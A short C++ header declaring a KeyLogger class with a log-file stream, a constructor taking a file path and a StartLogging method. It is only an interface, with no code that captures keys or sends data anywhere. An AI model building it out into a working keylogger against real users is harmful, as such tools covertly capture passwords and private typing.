#pragma once

#include <string>
#include <iostream>
#include <fstream>

using namespace std;

class KeyLogger
{
private:
	ofstream logFile;

public:
	KeyLogger(string filepath);
	~KeyLogger();
	void StartLogging();
};

